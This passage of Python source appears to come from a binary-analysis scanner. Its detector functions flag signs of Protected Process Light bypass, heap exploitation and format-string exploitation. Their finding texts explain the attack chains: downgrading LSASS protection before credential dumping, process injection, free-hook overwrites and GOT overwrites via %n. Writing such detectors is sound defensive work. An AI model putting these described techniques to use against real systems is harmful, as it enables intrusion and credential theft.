      - Process creation mitigation policy check (PROCESS_CREATION_MITIGATION_POLICY)
      - ZwSetInformationProcess with ProcessProtectionInformation (class 0x3D)
      - Kernel EPROCESS structure patching via NtQuerySystemInformation handle walk

    Sources: Windows Internals Part 1 (Protected Processes, EPROCESS layout);
    Practical Reverse Engineering ch.3 (kernel structures); PPLdump / PPLKiller
    public research.

    Returns a list of finding dicts {severity, title, detail, host, port}.
    """
    import re as _re

    findings: list = []

    # --- PROCESS_CREATION_MITIGATION_POLICY check ---
    # Protected Process Light enforces a binary signing policy: only Microsoft-
    # signed code may load into a PPL process (PROCESS_CREATION_MITIGATION_POLICY
    # bit field in the process attributes passed to NtCreateUserProcess or via
    # UpdateProcThreadAttribute).  A bypass attempt must first check whether the
    # mitigation policy is active; tools that probe this policy flag before
    # attempting injection indicate awareness of the PPL model.
    #
    # Strings: the constant name itself (in debug builds), or the numeric value
    # 0x00002000 (PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
    # encoded as a LE DWORD, or the UpdateProcThreadAttribute API with attribute
    # PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY (0x20007).
    policy_str_re = _re.compile(
        rb"PROCESS_CREATION_MITIGATION_POLICY", _re.IGNORECASE
    )
    # 0x00002000 LE DWORD (block non-MS DLLs always-on mask bit)
    policy_const_re = _re.compile(rb"\x00\x20\x00\x00")
    update_attr_re  = _re.compile(
        rb"\bUpdateProcThreadAttribute\b", _re.IGNORECASE
    )
    # PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x20007 as LE DWORD
    mitigation_attr_const = b"\x07\x00\x02\x00"
    has_policy_str   = policy_str_re.search(binary_data) is not None
    has_policy_const = policy_const_re.search(binary_data) is not None
    has_update_attr  = update_attr_re.search(binary_data) is not None
    has_mit_attr     = mitigation_attr_const in binary_data
    if has_policy_str or (has_update_attr and (has_policy_const or has_mit_attr)):
        findings.append({
            "severity": "MEDIUM",
            "title":    "PPL_POLICY_CHECK",
            "detail":   (
                "Process creation mitigation policy check present -- "
                "PROCESS_CREATION_MITIGATION_POLICY probing detected; signals: "
                + ("PROCESS_CREATION_MITIGATION_POLICY string reference; " if has_policy_str else "")
                + ("UpdateProcThreadAttribute API + mitigation policy constant; " if (has_update_attr and (has_policy_const or has_mit_attr)) else "")
                + "Protected Process Light (PPL) enforces a code-signing policy "
                "requiring that only Microsoft-signed (or appropriately signed) "
                "modules may load into a protected process; this check indicates "
                "the binary probes whether the BLOCK_NON_MICROSOFT_BINARIES "
                "mitigation is active before attempting injection or code loading "
                "into a target process; presence alone is MEDIUM (policy query), "
                "but in combination with ZwSetInformationProcess or kernel handle "
                "walk patterns it signals a full PPL bypass attempt; "
                "(Windows Internals Part 1: Protected Processes and signing levels; "
                "UpdateProcThreadAttribute PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- ZwSetInformationProcess with ProcessProtectionInformation (class 0x3D) ---
    # The ProcessProtectionInformation information class (0x3D = 61 decimal) passed
    # to ZwSetInformationProcess / NtSetInformationProcess allows setting the
    # protection level of a process from usermode -- when the call is not blocked
    # by a kernel PPL enforcement check.  Exploit tools use this to elevate a
    # non-protected process to PPL or to downgrade a PPL process to unprotected
    # before injecting into it.  The class constant 0x3D as a byte argument is
    # the primary signal; NtSetInformationProcess is the twin API.
    zwsetinfo_re = _re.compile(
        rb"\b(?:Zw|Nt)SetInformationProcess\b", _re.IGNORECASE
    )
    # ProcessProtectionInformation = 0x3D (61 decimal) as a single byte push arg
    # or as LE DWORD 0x0000003D
    ppi_byte_re  = _re.compile(rb"\x3d")           # byte 0x3D (broadest signal)
    ppi_dword_re = _re.compile(rb"\x3d\x00\x00\x00")  # LE DWORD 0x0000003D
    has_zwset    = zwsetinfo_re.search(binary_data) is not None
    has_ppi_dw   = ppi_dword_re.search(binary_data) is not None
    # Require both the API name and the class constant to reduce false positives
    if has_zwset and has_ppi_dw:
        findings.append({
            "severity": "CRITICAL",
            "title":    "PPL_ELEVATION_ATTEMPT",
            "detail":   (
                "Attempt to elevate process protection level via PPL bypass detected; "
                "ZwSetInformationProcess / NtSetInformationProcess present with "
                "ProcessProtectionInformation class constant (0x3D / 61 decimal); "
                "this information class allows setting the PS_PROTECTION structure "
                "on a target process, which controls the PPL type and signer level; "
                "offensive use: (1) upgrade own process to PPL to gain read/write "
                "access to other PPL processes, (2) downgrade a PPL-protected "
                "target (e.g., LSASS in RunAsPPL mode) to unprotected before "
                "credential dump; the call is only effective if a kernel vulnerability "
                "or a prior PPL-level process grants the elevated privilege, making "
                "this signal a strong indicator of a PPL bypass chain; "
                "(Windows Internals Part 1: PS_PROTECTION, RunAsPPL; "
                "NtSetInformationProcess class 0x3D = ProcessProtectionInformation)"
            ),
            "host": "localhost",
            "port": 0,
        })

    # --- Kernel EPROCESS patching via handle walk ---
    # The kernel PPL bypass technique (used by PPLKiller, PPLBlade, and similar)
    # works by: (1) enumerating kernel handles via NtQuerySystemInformation with
    # SystemExtendedHandleInformation (class 0x40 / 64), finding the EPROCESS
    # pointer for the target process, (2) using a kernel driver or BYOVD to write
    # directly to the Protection field in EPROCESS (offset varies by build, but
    # the approach is consistent), clearing the PPL type and signer.
    #
    # Key signals: NtQuerySystemInformation + SystemExtendedHandleInformation
    # constant (0x40 / 64), combined with a kernel write primitive (e.g.,
    # a vulnerable driver IOCTL or direct physical memory write via
    # \\.\PhysicalMemory / MmMapIoSpace).
    ntqsi_re = _re.compile(
        rb"\bNtQuerySystemInformation\b", _re.IGNORECASE
    )
    # SystemExtendedHandleInformation = 0x40 (64) as LE DWORD
    sehi_re          = _re.compile(rb"\x40\x00\x00\x00")
    # Kernel write primitives: physical memory device or MmMapIoSpace string
    phys_mem_re      = _re.compile(
        rb"(?:"
        rb"\\\\\.\\PhysicalMemory"
        rb"|"
        rb"\bMmMapIoSpace\b"
        rb"|"
        rb"\\\\\.\\[A-Za-z0-9_]{3,32}"  # arbitrary kernel device path (BYOVD)
        rb")",
        _re.IGNORECASE,
    )
    eprocess_str_re  = _re.compile(rb"\bEPROCESS\b", _re.IGNORECASE)
    has_ntqsi        = ntqsi_re.search(binary_data) is not None
    has_sehi         = sehi_re.search(binary_data) is not None
    has_phys_write   = phys_mem_re.search(binary_data) is not None
    has_eprocess_str = eprocess_str_re.search(binary_data) is not None
    # Require NtQuerySystemInformation + handle-info class + at least one kernel
    # write primitive or explicit EPROCESS reference.
    if has_ntqsi and has_sehi and (has_phys_write or has_eprocess_str):
        findings.append({
            "severity": "CRITICAL",
            "title":    "PPL_KERNEL_PATCH",
            "detail":   (
                "Kernel structure patching for PPL bypass detected; signals: "
                "NtQuerySystemInformation + SystemExtendedHandleInformation "
                "class (0x40) for kernel handle enumeration"
                + (", EPROCESS string reference (direct structure name in debug "
                   "strings or symbol lookup)" if has_eprocess_str else "")
                + (", kernel write primitive present (PhysicalMemory device path, "
                   "MmMapIoSpace, or BYOVD kernel device path)" if has_phys_write else "")
                + "; technique: enumerate all kernel handles via "
                "NtQuerySystemInformation(SystemExtendedHandleInformation) to "
                "obtain the EPROCESS kernel pointer for the target process, then "
                "use a kernel write primitive (vulnerable driver IOCTL / BYOVD, "
                "\\\\.\\ PhysicalMemory mapping, or MmMapIoSpace) to zero out the "
                "Protection field (PS_PROTECTION) in the EPROCESS structure, "
                "downgrading the PPL-protected process to unprotected; this "
                "grants full read/write/execute access to previously protected "
                "processes (LSASS, antivirus services, Windows Defender); "
                "(Windows Internals Part 1: EPROCESS layout, PS_PROTECTION offset; "
                "BYOVD: Bring Your Own Vulnerable Driver pattern for kernel access)"
            ),
            "host": "localhost",
            "port": 0,
        })

    return findings

    return findings


# ---------------------------------------------------------------------------
# Heap exploitation pattern detection (Hacking: Art of Exploitation ch. 0x300,
# 0x400 -- heap overflows, use-after-free, heap spraying, off-by-one)
# ---------------------------------------------------------------------------

def detect_heap_exploitation_patterns(binary_data: bytes) -> list:
    """
    Detect heap exploitation artifacts in a binary.

    Covers: heap spray patterns, cross-process heap write primitives,
    unsafe HeapCreate flags, page-permission manipulation combined with
    heap allocator APIs, custom free-hook installation, double-free
    indicators, and off-by-one strlen-based patterns.

    Informed by: Hacking: The Art of Exploitation (Erickson, 2nd ed.)
    ch. 0x300 (heap overflows, off-by-one errors) and ch. 0x400
    (overflows in other segments, heap unlinking attacks).

    Returns a list of finding dicts {severity, title, detail, host, port}.
    """
    import re as _re

    findings: list = []

    # --- Heap spray artifacts ---
    # Heap spraying fills the heap with a large repeating byte sled (NOP sled
    # 0x90, pivoting landing pad 0x0c0c0c0c, or AAAA padding 0x41414141) to
    # maximise the probability that an imprecise controlled jump lands in the
    # sled and slides into shellcode.  Hacking AoE ch. 0x300: memset(buffer,
    # 0x90, 60) NOP sled construction in exploit_notesearch.c.
    spray_hits = []
    if b'\x90' * 0x100 in binary_data:
        spray_hits.append("256+ consecutive NOP bytes (0x90 sled)")
    if b'\x0c' * 0x100 in binary_data:
        spray_hits.append("256+ consecutive 0x0c bytes (0x0c0c0c0c landing pad)")
    if b'\x41' * 0x100 in binary_data:
        spray_hits.append("256+ consecutive 0x41 bytes (AAAA padding sled)")
    if b'\x0c\x0c\x0c\x0c' * 64 in binary_data:
        tag = "256+ bytes of repeating 0x0c0c0c0c DWORD pattern"
        if tag not in spray_hits:
            spray_hits.append(tag)
    if spray_hits:
        findings.append({
            "severity": "HIGH",
            "title":    "HEAP_SPRAY_PATTERN",
            "detail":   (
                "Heap spray artifact detected; large repeating byte sled found: "
                + "; ".join(spray_hits) + "; "
                "heap spraying floods the allocator with NOP sleds or pivoting "
                "stubs so that an imprecise jump (from a controlled overflow or "
                "use-after-free) lands in the sled and slides into shellcode; "
                "0x0c0c0c0c is used on Windows because it encodes 'or al,0x0c' "
                "which is a NOP-equivalent in many register states and is also a "
                "valid heap pointer range on 32-bit Windows; "
                "(Hacking: Art of Exploitation ch. 0x300: NOP sled construction; "
                "exploit_notesearch.c: memset(buffer, 0x90, 60))"
            ),
            "host": "",
            "port": 0,
        })

    # --- Cross-process heap write primitive ---
    # VirtualAllocEx allocates memory in a remote process; WriteProcessMemory
    # writes into it.  Together they form the canonical cross-process code
    # injection primitive (process hollowing, reflective DLL injection).
    has_valloc_ex = b"VirtualAllocEx" in binary_data
    has_wpm       = b"WriteProcessMemory" in binary_data
    if has_valloc_ex and has_wpm:
        findings.append({
            "severity": "CRITICAL",
            "title":    "CROSS_PROCESS_HEAP_WRITE",
            "detail":   (
                "Cross-process heap write primitive: VirtualAllocEx + "
                "WriteProcessMemory both present; VirtualAllocEx allocates "
                "executable or writable pages in the virtual address space of a "
                "remote process (requires PROCESS_VM_OPERATION access); "
                "WriteProcessMemory writes shellcode or a payload DLL path into "
                "that allocation; this is the foundation of process injection, "
                "process hollowing (CreateProcess+SUSPEND, ZwUnmapViewOfSection, "
                "VirtualAllocEx, WriteProcessMemory, SetThreadContext), and "
                "reflective DLL injection; offensive capability is confirmed when "
                "combined with OpenProcess + CreateRemoteThread or NtCreateThreadEx; "
                "(Hacking: Art of Exploitation ch. 0x400: heap buffer overflows "
                "and cross-process write exploitation)"
            ),
            "host": "",
            "port": 0,
        })

    # --- HeapCreate with HEAP_NO_SERIALIZE (0x00000001) ---
    # HEAP_NO_SERIALIZE disables thread serialization on a private heap,
    # removing the lock that prevents concurrent free()/alloc() races.
    # Exploit code and custom allocators sometimes create serialization-free
    # heaps to avoid deadlocks or to enable deterministic free-list layouts
    # during exploitation.  Detection: HeapCreate present AND either the
    # string "HEAP_NO_SERIALIZE" (debug/symbol build) or the LE DWORD 0x00000001
    # encoding the flOptions argument.
    has_heap_create  = b"HeapCreate" in binary_data
    has_no_ser_str   = b"HEAP_NO_SERIALIZE" in binary_data
    has_no_ser_dword = b"\x01\x00\x00\x00" in binary_data
    if has_heap_create and (has_no_ser_str or has_no_ser_dword):
        signals = []
        if has_no_ser_str:
            signals.append("HEAP_NO_SERIALIZE string literal")
        if has_no_ser_dword:
            signals.append("LE DWORD 0x00000001 (HEAP_NO_SERIALIZE flag value)")
        findings.append({
            "severity": "MEDIUM",
            "title":    "HEAP_NO_SERIALIZE_FLAG",
            "detail":   (
                "HeapCreate with HEAP_NO_SERIALIZE flag detected; signals: "
                "HeapCreate present + " + ", ".join(signals) + "; "
                "HEAP_NO_SERIALIZE (0x00000001) disables the heap internal lock, "
                "removing thread safety guarantees; a race between concurrent "
                "free() and alloc() on the same unserialized heap can produce a "
                "use-after-free condition exploitable for controlled write "
                "primitives; exploit code uses this flag to eliminate lock "
                "contention during heap spray or to construct deterministic "
                "free-list layouts; "
                "(Hacking: Art of Exploitation ch. 0x400: heap memory management "
                "and free() detection; Windows HeapCreate flOptions)"
            ),
            "host": "",
            "port": 0,
        })

    # --- Heap manipulation combined with page-permission change ---
    # RtlAllocateHeap / RtlFreeHeap are the NT-level heap primitives underlying
    # HeapAlloc/HeapFree.  Pairing them with VirtualProtect (Windows) or
    # mprotect (POSIX shim / Wine / cross-platform code) suggests the binary
    # allocates heap memory and then changes its permissions (RW to RX) to
    # execute injected code -- a pattern in staged shellcode loaders.
    has_rtl_alloc = b"RtlAllocateHeap" in binary_data
    has_rtl_free  = b"RtlFreeHeap" in binary_data
    has_vprotect  = b"VirtualProtect" in binary_data
    has_mprotect  = b"mprotect" in binary_data
    if (has_rtl_alloc or has_rtl_free) and (has_vprotect or has_mprotect):
        perm_api = "VirtualProtect" if has_vprotect else "mprotect"
        heap_apis = []
        if has_rtl_alloc:
            heap_apis.append("RtlAllocateHeap")
        if has_rtl_free:
            heap_apis.append("RtlFreeHeap")
        findings.append({
            "severity": "HIGH",
            "title":    "HEAP_MANIPULATION_WITH_PAGE_PERM",
            "detail":   (
                "Heap allocation combined with page-permission change: "
                + " + ".join(heap_apis) + " + " + perm_api + " present; "
                "the pattern: allocate writable heap memory, write shellcode or "
                "a decoded payload, then call VirtualProtect/mprotect to flip "
                "the page to executable (RW to RX); this bypasses W^X enforcement "
                "when it is not applied at allocation time; RtlAllocateHeap / "
                "RtlFreeHeap are NT-layer primitives whose direct use combined "
                "with permission changes is a strong staged-loader indicator; "
                "(Hacking: Art of Exploitation ch. 0x400: heap overflow control "
                "flow; Windows NT heap internals)"
            ),
            "host": "",
            "port": 0,
        })

    # --- Custom allocator free hook ---
    # tcmalloc and jemalloc expose hook points (tcmalloc_free_hook, __free_hook
    # in glibc) called on every free().  Overwriting these hooks with a function
    # pointer is the free-hook exploitation technique: trigger free() on an
    # attacker-controlled chunk, have the hook redirected to system() or shellcode.
    hook_strings = [
        b"tcmalloc_free_hook",
        b"__free_hook",
        b"__malloc_hook",
        b"tcmalloc_new_hook",
    ]
    found_hooks = [h.decode() for h in hook_strings if h in binary_data]
    if found_hooks:
        findings.append({
            "severity": "HIGH",
            "title":    "CUSTOM_ALLOCATOR_HOOK",
            "detail":   (
                "Custom allocator hook installation detected; strings found: "
                + ", ".join(found_hooks) + "; "
                "__free_hook (glibc) and tcmalloc_free_hook (Google tcmalloc) "
                "are global function pointers called on every free(); "
                "overwriting __free_hook with a pointer to system() and then "
                "freeing a chunk containing '/bin/sh' is a classic glibc heap "
                "exploitation primitive; __malloc_hook is the equivalent for "
                "allocation; in modern glibc (>= 2.34) these hooks are removed "
                "but remain present in tcmalloc and jemalloc; presence in a "
                "binary strongly suggests hook-based exploitation or custom "
                "memory instrumentation; "
                "(Hacking: Art of Exploitation ch. 0x400: heap control flow; "
                "glibc malloc internals: __free_hook, __malloc_hook)"
            ),
            "host": "",
            "port": 0,
        })

    # --- Double-free primitive indicator ---
    # A double-free corrupts the ptmalloc2 / dlmalloc free-list, allowing the
    # allocator to return the same chunk to two independent callers -- a
    # write-what-where condition.  Detection heuristic: HeapFree or free
    # present AND either a "double free" debug string or HeapFree referenced
    # twice within 512 bytes (import table or call-site proximity artifact).
    has_heapfree    = b"HeapFree" in binary_data
    has_free_sym    = b"\x66\x72\x65\x65\x00" in binary_data  # "free\0"
    has_double_free = (b"double free" in binary_data or
                       b"double-free" in binary_data)
    heapfree_re     = _re.compile(rb"HeapFree.{0,512}HeapFree", _re.DOTALL)
    has_hf_pair     = heapfree_re.search(binary_data) is not None
    if (has_heapfree or has_free_sym) and (has_double_free or has_hf_pair):
        sig2 = []
        if has_double_free:
            sig2.append("'double free' or 'double-free' string literal")
        if has_hf_pair:
            sig2.append("HeapFree referenced twice within 512 bytes")
        findings.append({
            "severity": "HIGH",
            "title":    "DOUBLE_FREE_PRIMITIVE_INDICATOR",
            "detail":   (
                "Double-free exploitation indicator detected; signals: "
                + "; ".join(sig2) + "; "
                "a double-free corrupts the ptmalloc2 free-list (prev/next "
                "pointers in chunk headers), causing the allocator to return "
                "the same chunk to two independent callers; the second caller "
                "writes into memory that the first caller also holds, producing "
                "a type confusion or use-after-free write primitive; in HeapFree "
                "(Windows) a double-free raises a heap corruption exception "
                "unless the heap was created with HEAP_NO_SERIALIZE, which "
                "suppresses the check; the double-free to tcache poisoning chain "
                "in modern glibc achieves arbitrary alloc; "
                "(Hacking: Art of Exploitation ch. 0x400: free() invalid next "
                "size detection; notetaker.c heap overflow and glibc free())"
            ),
            "host": "",
            "port": 0,
        })

    # --- Off-by-one strlen pattern ---
    # Off-by-one / fencepost errors (ch. 0x300) frequently arise from strlen()-
    # based size calculations where the programmer forgets the null terminator
    # byte: strlen() returns N but N+1 bytes are needed.  Heuristic: strlen
    # paired with an unsafe copy API (strcpy or strncpy + memcpy) in the same
    # binary -- the classic off-by-one setup where strlen(src) is used as the
    # copy length and the null byte overflows into the adjacent allocation.
    has_strlen  = b"strlen" in binary_data
    has_strcpy  = b"strcpy" in binary_data
    has_strncpy = b"strncpy" in binary_data
    has_memcpy  = b"memcpy" in binary_data
    if has_strlen and (has_strcpy or (has_strncpy and has_memcpy)):
        copy_apis = []
        if has_strcpy:
            copy_apis.append("strcpy")
        if has_strncpy:
            copy_apis.append("strncpy")
        findings.append({
            "severity": "MEDIUM",
            "title":    "OFF_BY_ONE_PATTERN",
            "detail":   (
                "Potential off-by-one pattern: strlen combined with unsafe copy "
                "API (" + ", ".join(copy_apis) + ") detected; "
                "the canonical error uses strlen(src) as the length argument to "
                "a copy function, forgetting that strlen() does not count the "
                "null terminator; allocating strlen(s) bytes and then copying s "
                "writes one byte past the buffer boundary; on the stack this "
                "overwrites the adjacent variable's first byte (as demonstrated "
                "in auth_overflow.c: 16-byte password_buffer overflowed into "
                "auth_flag); on the heap this overwrites the next chunk's size "
                "field enabling heap unlinking exploitation; the OpenSSH channel "
                "CVE (id > channels_alloc instead of id >= channels_alloc) is "
                "the canonical fencepost error that escalated authenticated users "
                "to root; "
                "(Hacking: Art of Exploitation ch. 0x300: off-by-one / fencepost "
                "errors; ch. 0x400: heap overflow via off-by-one null byte)"
            ),
            "host": "",
            "port": 0,
        })

    return findings


# ---------------------------------------------------------------------------
# Format string exploitation surface detection (Hacking: Art of Exploitation
# ch. 0x300 -- format string vulnerabilities, %n write primitive, GOT overwrite)
# ---------------------------------------------------------------------------

def detect_format_string_exploitation(binary_data: bytes) -> list:
    """
    Detect format string vulnerability surface and exploitation artifacts.

    Covers: direct printf(user_input) pattern, %n write primitive presence,
    GOT/DTORS overwrite capability, positional parameter access (%N$x),
    syslog format string surface, and snprintf length confusion.

    Informed by: Hacking: The Art of Exploitation (Erickson, 2nd ed.)
    ch. 0x300 -- fmt_vuln.c (printf(text) vs printf('%s', text)), %n as a
    write-what-where primitive, direct parameter access (%N$n), .dtors and
    GOT overwrite via format string exploit chains.

    Returns a list of finding dicts {severity, title, detail, host, port}.
    """
    import re as _re

    findings: list = []

    # Collect format function presence flags used by multiple checks below
    has_printf   = b"printf"   in binary_data
    has_fprintf  = b"fprintf"  in binary_data
    has_sprintf  = b"sprintf"  in binary_data
    has_snprintf = b"snprintf" in binary_data
    has_vprintf  = b"vprintf"  in binary_data
    has_vsprintf = b"vsprintf" in binary_data
    has_syslog   = b"syslog"   in binary_data
    any_fmt_func = any([has_printf, has_fprintf, has_sprintf,
                        has_vprintf, has_vsprintf, has_syslog])

    # --- Direct format string call (printf(user_input) pattern) ---
    # The vulnerability: printf(string) instead of printf("%s", string).
    # Detection heuristic: format function present alongside user-input API
    # (fgets, read, recv, gets, scanf) with low or zero format-specifier
    # literal density -- suggesting raw user strings are passed as format args.
    user_input_apis = [b"fgets", b"gets\x00", b"read\x00", b"recv\x00",
                       b"fread", b"scanf"]
    has_user_input  = any(api in binary_data for api in user_input_apis)
    fmt_spec_count  = len(_re.findall(rb'%[sdxuonfFeEgGp]', binary_data))
    fmt_func_count  = sum(1 for f in [b"printf\x00", b"fprintf\x00",
                                      b"sprintf\x00", b"vprintf\x00"]
                          if f in binary_data)
    if any_fmt_func and has_user_input and (
            fmt_spec_count == 0 or
            (fmt_func_count > 0 and fmt_spec_count < fmt_func_count)):
        fmt_names = [f.decode() for f in
                     [b"printf", b"fprintf", b"sprintf", b"vprintf",
                      b"vsprintf", b"syslog"]
                     if f in binary_data]
        findings.append({
            "severity": "HIGH",
            "title":    "FORMAT_STRING_DIRECT_CALL",
            "detail":   (
                "Format string direct-call surface detected; format functions "
                "(" + ", ".join(fmt_names) + ") present alongside user-input "
                "APIs (fgets/gets/read/recv/scanf) with low or zero format "
                "specifier literal density (" + str(fmt_spec_count) +
                " specifier(s) found vs " + str(fmt_func_count) +
                " format function import(s)); the classic vulnerability pattern: "
                "printf(user_string) instead of printf('%s', user_string); "
                "when user input contains %x/%s/%n the format function reads "
                "from or writes to arbitrary stack or memory addresses; "
                "fmt_vuln.c (Hacking AoE ch. 0x300): printf(text) with "
                "text='%08x.%08x...' leaks stack memory; with '%n' it writes "
                "to arbitrary addresses; "
                "(Hacking: Art of Exploitation ch. 0x300: format string "
                "vulnerability -- printf(string) vs printf('%s', string))"
            ),
            "host": "",
            "port": 0,
        })

    # --- %n write primitive ---
    # The %n format parameter writes the number of bytes output so far to the
    # address in the corresponding argument.  This is the core write-what-where
    # primitive in format string exploitation: an attacker controls both the
    # value written (%Nx pads output to N bytes) and the target address
    # (embedded in the format string, accessed via direct parameter %N$n).
    # Hacking AoE ch. 0x300: four-write technique, short writes (%hn), direct
    # parameter access to write full 32-bit addresses byte-by-byte.
    pct_n_re      = _re.compile(rb'%(?:\d+\$)?(?:h|l|ll)?n')
    pct_n_matches = pct_n_re.findall(binary_data)
    if pct_n_matches:
        sample = ", ".join(repr(m) for m in pct_n_matches[:5])
        if len(pct_n_matches) > 5:
            sample += "; ..."
        findings.append({
            "severity": "CRITICAL",
            "title":    "FORMAT_STRING_WRITE_PRIMITIVE",
            "detail":   (
                "Format string %n write primitive found; "
                + str(len(pct_n_matches)) + " occurrence(s): " + sample + "; "
                "%n writes the count of bytes output so far to the address "
                "supplied as the corresponding function argument; an attacker "
                "controlling a format string can embed target addresses and use "
                "%Nx padding to write arbitrary values byte-by-byte; the four-"
                "write technique (Hacking AoE ch. 0x300) writes a full 4-byte "
                "address via four sequential %n writes to addr+0..addr+3; "
                "%hn (short write) reduces this to two writes of two-byte shorts; "
                "direct parameter access (%N$n) eliminates sequential stack "
                "traversal; demonstrated against fmt_vuln.c: "
                "test_val overwritten to 0xddccbbaa and 0xbffffd72; "
                "(Hacking: Art of Exploitation ch. 0x300: %n write primitive, "
                "four-write technique, short writes, direct parameter access)"
            ),
            "host": "",
            "port": 0,
        })

    # --- GOT overwrite via format string ---
    # The canonical exploit target: overwrite a GOT entry for a frequently
    # called function (exit, printf) with the address of shellcode or a
    # one-gadget.  Requires: %n present AND GOT/PLT-related symbols visible.
    # Hacking AoE ch. 0x300: exit@GOT at 0x08049784 overwritten to shellcode
    # address via fmt_vuln; also __DTOR_LIST__+4 overwrite for destructor hook.
    got_indicators = [
        b"_GLOBAL_OFFSET_TABLE_",
        b"__DTOR_LIST__",
        b"__DTOR_END__",
        b"JUMP_SLOT",
        b".got.plt",
        b".dtors",
    ]
    has_got_syms = any(sym in binary_data for sym in got_indicators)
    has_pct_n    = pct_n_re.search(binary_data) is not None
    if has_pct_n and has_got_syms:
        found_syms = [s.decode() for s in got_indicators if s in binary_data]
        findings.append({
            "severity": "CRITICAL",
            "title":    "FORMAT_STRING_GOT_OVERWRITE",
            "detail":   (
                "Format string GOT/DTORS overwrite chain detected; %n write "
                "primitive present AND GOT/PLT/DTORS symbols found: "
                + ", ".join(found_syms) + "; "
                "the canonical format string exploit (Hacking AoE ch. 0x300) "
                "overwrites a GOT entry (writable pointer table that PLT jump "
                "stubs dereference) with the address of shellcode; the target "
                "is typically exit() or printf() so the overwrite triggers on "
                "the next call; alternatively __DTOR_LIST__+4 is overwritten so "
                "shellcode runs when main() exits; the GOT is writable even "
                "though .plt is READONLY (confirmed via objdump -h); GOT "
                "addresses are binary-fixed, making them reliable across machines "
                "running the same binary; "
                "(Hacking: Art of Exploitation ch. 0x300: .dtors overwrite, "
                "GOT overwrite -- exit@GOT at 0x08049784)"
            ),
            "host": "",
            "port": 0,
        })

    # --- Positional parameter access (%N$x / %N$n) ---
    # Direct parameter access (%N$fmt) lets a format string exploit reference
    # arbitrary stack positions without sequential %x traversal.  High-index
    # positional params (>= 10) are strong exploitation signals -- normal i18n
    # code rarely exceeds %5.  Hacking AoE ch. 0x300: ./fmt_vuln AAAA%4\$x
    # directly accesses position 4 (the beginning of the format string),
    # eliminating junk DWORD spacers needed by sequential access.
    pos_param_re = _re.compile(rb'%(\d{1,3})\$[xXnsduhH]')
    pos_matches  = pos_param_re.findall(binary_data)
    high_pos     = [m for m in pos_matches if int(m) >= 10]
    if high_pos:
        sample = ", ".join("%" + m.decode() + "$..." for m in high_pos[:8])
        if len(high_pos) > 8:
            sample += "; ..."
        findings.append({
            "severity": "HIGH",
            "title":    "FORMAT_STRING_POSITIONAL_PARAMS",
            "detail":   (
                "High-index positional format parameters detected; "
                + str(len(high_pos)) + " occurrence(s) with index >= 10: "
                + sample + "; "
                "positional parameter access (%N$fmt) is used in format string "
                "exploits to reference specific stack positions directly; high "
                "indices (>= 10) suggest targeting deep stack memory or the "
                "beginning of the format string buffer itself; the direct "
                "parameter access technique from Hacking AoE ch. 0x300 uses "
                "%4$n to write to the address embedded at the start of the "
                "format string, eliminating junk DWORD spacers required by "
                "sequential access; "
                "(Hacking: Art of Exploitation ch. 0x300: direct parameter "
                "access, %N$n syntax, fmt_vuln exploit chain)"
            ),
            "host": "",
            "port": 0,
        })
    elif pos_matches:
        sample = ", ".join("%" + m.decode() + "$..." for m in pos_matches[:8])
        findings.append({
            "severity": "MEDIUM",
            "title":    "FORMAT_STRING_POSITIONAL_PARAMS",
            "detail":   (
                "Positional format parameters detected; "
                + str(len(pos_matches)) + " occurrence(s) with index < 10: "
                + sample + "; low-index positional params may be legitimate "
                "i18n strings but also appear in format string exploitation; "
                "review in context; "
                "(Hacking: Art of Exploitation ch. 0x300: direct parameter access)"
            ),
            "host": "",
            "port": 0,
        })

    # --- syslog format string surface ---
    # syslog(priority, format, ...) is a common format string vulnerability
    # vector when written as syslog(LOG_ERR, user_message) instead of
    # syslog(LOG_ERR, "%s", user_message).  syslog passes its format argument
    # to vsyslog() which calls vprintf() internally, so all format string
    # primitives including %n apply.  Detection: syslog present AND the call
    # sites lack a nearby format specifier literal.
    if has_syslog:
        syslog_positions = [m.start() for m in
                            _re.finditer(rb'\bsyslog\b', binary_data)]
        safe_count = 0
        for pos in syslog_positions:
            window = binary_data[max(0, pos - 64):pos + 128]
            if _re.search(rb'%[sdxu]', window):
                safe_count += 1
        unsafe_count = len(syslog_positions) - safe_count
        if unsafe_count > 0:
            findings.append({
                "severity": "HIGH",
                "title":    "SYSLOG_FORMAT_STRING_SURFACE",
                "detail":   (
                    "syslog() calls without nearby format specifier literal "
                    "detected; " + str(unsafe_count) + " of "
                    + str(len(syslog_positions)) +
                    " syslog reference(s) lack a '%s'/'%d'/'%x' specifier "
                    "within 128 bytes; vulnerability pattern: "
                    "syslog(LOG_ERR, user_input) instead of "
                    "syslog(LOG_ERR, '%s', user_input); syslog passes the format "
                    "string to vsyslog() -> vprintf() internally, so %n applies "
                    "and an attacker-controlled syslog message achieves arbitrary "
                    "memory write; network-facing services that log user input via "
                    "syslog without a fixed format string are remotely exploitable; "
                    "(Hacking: Art of Exploitation ch. 0x300: format string "
                    "vulnerability surface; syslog(3) man page)"
                ),
                "host": "",
                "port": 0,
            })

    # --- snprintf length confusion ---
    # snprintf(buf, n, fmt, ...) is misused in two ways: (1) the programmer
    # passes strlen(user_input) as n (user-controlled size, defeating the bound);
    # (2) the return value (bytes that *would* be written, not bytes written) is
    # used as a length for a subsequent copy, causing overflow on truncation.
    # Detection: snprintf and strlen both present, with call sites within 256
    # bytes of each other (import table or code proximity heuristic).
    has_strlen2 = b"strlen" in binary_data
    if has_snprintf and has_strlen2:
        snprintf_pos = [m.start() for m in
                        _re.finditer(rb'\bsnprintf\b', binary_data)]
        strlen_pos   = [m.start() for m in
                        _re.finditer(rb'\bstrlen\b', binary_data)]
        close_pairs  = 0
        for sp in snprintf_pos:
            for sl in strlen_pos:
                if abs(sp - sl) <= 256:
                    close_pairs += 1
                    break
        if close_pairs > 0:
            findings.append({
                "severity": "MEDIUM",
                "title":    "SNPRINTF_LENGTH_CONFUSION",
                "detail":   (
                    "snprintf + strlen proximity pattern detected; "
                    + str(close_pairs) + " snprintf call site(s) within 256 "
                    "bytes of a strlen reference; common misuse patterns: "
                    "(1) snprintf(buf, strlen(user_input), fmt, ...) -- passes "
                    "user-controlled length as the size limit, defeating the "
                    "bounds check; (2) n = snprintf(buf, size, fmt, ...); "
                    "buf += n -- uses the return value (bytes that would be "
                    "written, not bytes written) as an offset, causing out-of-"
